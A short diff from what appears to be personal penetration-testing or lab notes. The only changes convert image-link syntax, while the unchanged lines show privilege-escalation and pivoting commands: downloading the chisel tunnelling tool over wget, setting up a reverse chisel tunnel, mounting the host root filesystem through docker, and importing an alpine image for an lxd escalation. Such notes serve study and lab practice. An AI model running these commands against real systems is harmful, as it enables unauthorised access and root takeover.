@@ -59,7 +59,7 @@ wget [http://10.10.13.25:9999/chisel](http://10.10.13.25:9999/chisel)
 ./chisel client 10.17.66.176:9001 R:3333:127.0.0.1:6666  
 ./chisel server --reverse --port 9001
 
-![Exported image](Exported%20image%2020241213144602-0.png)  
+![[Exported image 20241213144602-0.png|Exported image]]  
 
 ----------------------------------------User Groups
  
@@ -76,9 +76,9 @@ docker run -v /:/mnt -it bash sh
  
 lxc image list
 
-![Exported image](Exported%20image%2020241213144604-1.png)  
-![Exported image](Exported%20image%2020241213144606-2.png)  
-![Exported image](Exported%20image%2020241213144608-3.png)
+![[Exported image 20241213144604-1.png|Exported image]]  
+![[Exported image 20241213144606-2.png|Exported image]]  
+![[Exported image 20241213144608-3.png|Exported image]]
 
 lxc image import ./alpine.tar.gz --alias alpineimg  
 lxc image list  
